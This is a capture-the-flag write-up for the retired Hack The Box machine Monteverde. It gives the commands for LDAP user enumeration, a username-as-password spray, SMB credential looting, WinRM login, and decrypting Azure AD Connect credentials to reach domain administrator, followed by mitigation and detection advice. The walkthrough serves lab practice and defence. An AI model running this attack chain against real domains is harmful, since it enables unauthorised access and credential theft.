---
machine: Monteverde
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, azure-ad-connect, ldap, smb, winrm]
---

# Monteverde — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags, hashes or credentials.

## TL;DR

An anonymous LDAP bind lists all users. A `user=password` spray compromises `SABatchJobs`, which accesses an SMB share containing `azure.xml` and `mhope`'s password. `mhope` is in `Azure Admins` and the DC runs Azure AD Connect; the `ADSync` database stores the administrator's credentials reversibly.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p53,88,135,139,389,445,5985,9389 <IP>
```

Add `monteverde.htb` to hosts. Anonymous LDAP bind is allowed:

```bash
ldapsearch -x -H ldap://<IP> -b 'DC=monteverde,DC=htb' '(objectClass=user)' sAMAccountName
```

This returns the user list. Test `user:user` against SMB/WinRM:

```bash
crackmapexec smb <IP> -u users.txt -p users.txt --no-brute
```

## Initial access

`SABatchJobs` reuses its name as password. Enumerate SMB shares:

```bash
smbclient -L //<IP> -U 'SABatchJobs%<PASS>'
smbclient //<IP>/users$ -U 'SABatchJobs%<PASS>'
```

`users$\mhope\azure.xml` contains cleartext credentials. Use WinRM:

```bash
evil-winrm -i <IP> -u mhope -p '<PASS>'
```

## Escalation to administrator

```powershell
whoami /groups
# Azure Admins
```

Azure AD Connect is installed on the DC. The `ADSync` database stores encrypted credentials for the `MSOL_*` account. Use a public decryption script (for example `AdDecrypt.exe` or `azuread_decrypt_msol.ps1`) with the service keys:

```powershell
.\AdDecrypt.exe -Server <DC> -User <MSOL_USER> -Password '<MSOL_PASS>'
```

This returns the administrator password. Log in over WinRM and read the flag. Redact it.

## Evidence

- Anonymous LDAP bind and redacted user list.
- Spray and SMB access to `users$`.
- `azure.xml` with password redacted.
- `whoami /groups` and redacted `AdDecrypt` output.

## Lessons learned

- Anonymous LDAP bind enables spraying.
- Passwords equal to the username still work.
- A configuration XML can hold cleartext credentials.
- Azure AD Connect stores secrets reversibly in `ADSync`.

## Mitigation and detection

- Disable anonymous LDAP bind.
- Enforce strong passwords and MFA; block spraying.
- Restrict `users$` reads and protect `azure.xml`.
- Limit `Azure Admins` and audit `ADSync` access.
- Detect bulk LDAP queries and access to `ADSync.mdf`.

## References

- <https://www.hackthebox.com/machines/monteverde>
- <https://learn.microsoft.com/en-us/azure/active-directory/hybrid/>
- <https://attack.mitre.org/techniques/T1110/003/>
